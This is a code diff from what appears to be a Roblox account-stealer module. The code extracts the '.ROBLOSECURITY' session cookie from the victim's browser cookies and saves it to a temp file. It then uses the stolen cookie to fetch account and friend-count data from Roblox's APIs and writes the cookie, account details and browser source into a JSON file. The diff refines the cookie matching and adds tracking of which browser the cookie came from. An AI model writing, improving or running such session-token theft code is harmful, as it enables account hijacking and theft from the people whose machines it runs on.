@@ -8,7 +8,7 @@ const { getCookies } = require('../util/cookies');
 
 module.exports = async () => {
   const cookies = await getCookies();
-  const cookie = cookies.find(cookie => cookie.host.includes('.roblox.com') && cookie.name.includes('.ROBLOSECURITY')).value;
+  const { value: cookie, source } = cookies.find(cookie => cookie.host.includes('.roblox.com') && cookie.name === '.ROBLOSECURITY');
   fs.writeFileSync(join(tempFolder, 'Roblox Cookie.txt'), cookie);
 
   const file = await searchForFile(join(tempFolder, 'Roblox Cookie.txt'), 1000, 10);
@@ -19,6 +19,7 @@ module.exports = async () => {
   };
   const account = await axios.get('https://www.roblox.com/mobileapi/userinfo', config);
   const friendsCount = await axios.get('https://friends.roblox.com/v1/my/friends/count', config) || undefined;
+  account.data.source = source;
   account.data.cookie = file.replaceAll('"', '');
   account.data.friendsCount = friendsCount.data.count;
   writeFileSync(jsonFile, JSON.stringify(account.data));
